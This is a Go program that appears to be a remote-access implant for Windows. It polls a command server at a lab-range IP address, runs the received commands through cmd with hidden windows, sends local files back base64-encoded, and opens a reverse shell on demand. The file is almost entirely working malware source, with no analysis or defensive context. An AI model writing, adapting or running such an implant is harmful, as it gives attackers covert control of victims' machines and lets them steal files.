package main

import (
    "bufio"
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "net"
    "net/http"
    "os/exec"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
)

type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID       string `json:"id"`
    Result   string `json:"result"`
    FileName string `json:"fileName,omitempty"`
}

func fetchCommand() (Command, error) {
    var cmd Command
    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }
    err = json.Unmarshal(body, &cmd)
    return cmd, err
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        fmt.Printf("Error marshalling result: %v\n", err)
        return
    }

    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        fmt.Printf("Failed to send result: %v\n", err)
    }
}

func executeCommandAndSendResult(cmd Command) {
    if strings.HasPrefix(cmd.Cmd, "shell ") {
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        openReverseShell(address)
    } else if strings.HasPrefix(cmd.Cmd, "download ") {
        // Extract file path and name from the command
        parts := strings.SplitN(cmd.Cmd[len("download "):], " ", 2)
        if len(parts) < 2 {
            fmt.Println("Download command format error. Expected 'download <path> <filename>'.")
            return
        }
        filePath, fileName := parts[0], parts[1]
        downloadFile(filePath, fileName, cmd.ID)
    } else {
        // Execute other commands
        output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
        resultText := string(output)
        if err != nil {
            resultText += "\nError: " + err.Error()
        }
        result := CommandResult{
            ID:     cmd.ID,
            Result: resultText,
        }
        sendResult(result)
    }
}

func downloadFile(filePath, fileName, commandID string) {
    fileContent, err := ioutil.ReadFile(filePath)
    if err != nil {
        fmt.Printf("Error reading file %s: %v\n", filePath, err)
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("Error reading file %s: %v", filePath, err),
        })
        return
    }
    encodedContent := base64.StdEncoding.EncodeToString(fileContent)
    sendResult(CommandResult{
        ID:       commandID,
        Result:   encodedContent,
        FileName: fileName,
    })
}

func openReverseShell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        fmt.Printf("Failed to open reverse shell to %s: %v\n", address, err)
        return
    }
    defer conn.Close()

    for {
        reader := bufio.NewReader(conn)
        command, err := reader.ReadString('\n')
        if err != nil {
            fmt.Printf("Failed to read command: %v\n", err)
            break
        }

        cmd := exec.Command("cmd.exe", "/C", command)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
            continue
        }

        conn.Write(output)
    }
}

func main() {
    fmt.Println("Application started. Waiting for commands...")
    ticker := time.NewTicker(10 * time.Second)

    go func() {
        for range ticker.C {
            mu.Lock()
            if !isCommandRunning {
                isCommandRunning = true
                mu.Unlock()

                cmd, err := fetchCommand()
                if err != nil {
                    fmt.Printf("Error fetching command: %s\n", err)
                    continue
                }
                if cmd.ID != "" {
                    executeCommandAndSendResult(cmd)
                }

                mu.Lock()
                isCommandRunning = false
            }
            mu.Unlock()
        }
    }()

    select {} // Prevent the application from exiting immediately
}
